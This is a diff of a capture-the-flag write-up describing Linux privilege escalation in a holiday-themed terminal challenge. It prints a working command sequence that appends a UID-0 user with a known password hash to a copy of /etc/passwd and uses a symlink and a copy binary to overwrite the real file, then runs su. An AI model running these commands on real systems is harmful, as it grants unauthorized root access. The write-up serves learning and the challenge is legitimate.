@@ -1,4 +1,25 @@
 # Linux PrivESC:
+When I first started the challenge, I was greeted with:
+
+```txt
+In a digital winter wonderland we play,
+Where elves and bytes in harmony lay.
+This festive terminal is clear and bright,
+Escalate privileges, and bring forth the light.
+
+Start in the land of bash, where you reside,
+But to win this game, to root you must glide.
+Climb the ladder, permissions to seize,
+Unravel the mystery, with elegance and ease.
+
+There lies a gift, in the root's domain,
+An executable file to run, the prize you'll obtain.
+The game is won, the challenge complete,
+Merry Christmas to all, and to all, a root feat!
+
+* Find a method to escalate privileges inside this terminal and then run the binary in /root *
+```
+
 Using the article provided by the hint *Linux Privilege Escalation Guide (Updated for 2023)* by Rashid-Ferose published by Payatu, I tried the strategies provided by the article. When I came across this:
 
 ![](../images/Linux-PrivEsc-part-1.png)
@@ -46,7 +67,14 @@ I then followed the instructions, and typed:
 ```txt
 mkdir source
 cp /etc/passwd source/passwd
-echo 'root2:pass:
+echo 'root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash' >> source/passwd
+ln -s /etc destination
+simplecopy source/passwd destination
+su root2
+```
+When asked for the password for the `su` user root2, I typed `mrcake` (WVLY0mgH0RtUI is mrcake encrypted as mentioned by the article that root2's password is mrcake). I then gained root access. Since I had to run the binary that was in the `/root` folder, I typed:
+
+
 
 
 
